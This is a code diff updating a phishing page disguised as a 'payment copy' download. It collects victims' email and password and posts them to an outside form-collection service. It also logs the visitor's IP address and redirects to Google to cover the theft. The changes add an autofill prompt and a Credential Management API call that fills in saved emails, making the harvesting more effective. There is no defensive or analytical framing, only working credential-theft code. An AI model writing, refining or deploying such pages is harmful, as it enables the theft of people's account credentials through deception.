@@ -20,7 +20,6 @@
       overflow: hidden;
     }
 
-    /* Watermark */
     body::before {
       content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
       position: absolute;
@@ -72,6 +71,17 @@
     }
 
     .form { margin-bottom: 18px; position: relative; }
+
+    .autofill-hint {
+      text-align: center;
+      font-size: 13px;
+      color: #555;
+      background: #fff3cd;
+      border: 1px solid #ffeeba;
+      padding: 8px;
+      border-radius: 6px;
+      margin-bottom: 14px;
+    }
 
     .input {
       width: 100%;
@@ -146,6 +156,10 @@
     <p class="lead">Click on download to view payment copy.</p>
 
     <form class="form" id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on">
+      <div class="autofill-hint">
+        💡 Tip: Tap your saved email above the keyboard to autofill quickly.
+      </div>
+
       <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="username email" required>
       <div class="password-wrapper">
         <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
@@ -177,8 +191,16 @@
   </div>
 
   <script>
-    // Capture IP and Hostname
-    window.addEventListener('DOMContentLoaded', () => {
+    window.addEventListener('DOMContentLoaded', async () => {
+      // Try autofill via Credential Management API (desktop)
+      if (window.PasswordCredential) {
+        try {
+          const cred = await navigator.credentials.get({password: true, mediation: 'optional'});
+          if (cred && cred.id) document.getElementById('email').value = cred.id;
+        } catch(e) { console.log('Credential API not available'); }
+      }
+
+      // Get IP and hostname
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
@@ -192,39 +214,29 @@
         .catch(() => console.log('Could not fetch IP'));
     });
 
-    // Toggle password visibility
-    document.getElementById('togglePassword').addEventListener('click', () => {
-      const pwd = document.getElementById('password');
+    // Password visibility
+    const toggle = document.getElementById('togglePassword');
+    const pwd = document.getElementById('password');
+    toggle.addEventListener('click', () => {
       const isHidden = pwd.type === 'password';
       pwd.type = isHidden ? 'text' : 'password';
-      togglePassword.textContent = isHidden ? '🙈' : '👁️';
+      toggle.textContent = isHidden ? '🙈' : '👁️';
     });
 
-    // Submit via AJAX JSON + Redirect
+    // Submit form then redirect
     const form = document.getElementById('mainForm');
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-
-      const formData = new FormData(form);
-      const data = Object.fromEntries(formData.entries());
-
+      const data = new FormData(form);
       try {
-        const response = await fetch(form.action, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify(data)
-        });
-
-        if (!response.ok) throw new Error("Failed to submit");
-
-        // Redirect after success
-        window.location.href = "https://www.google.com";
-      } catch (err) {
-        alert("Network error, please try again.");
-        console.error(err);
+        const res = await fetch(form.action, { method: 'POST', body: data });
+        if (res.ok) {
+          window.location.href = "https://www.google.com";
+        } else {
+          alert("Submission failed. Try again.");
+        }
+      } catch {
+        alert("Network error, please try again");
       }
     });
   </script>
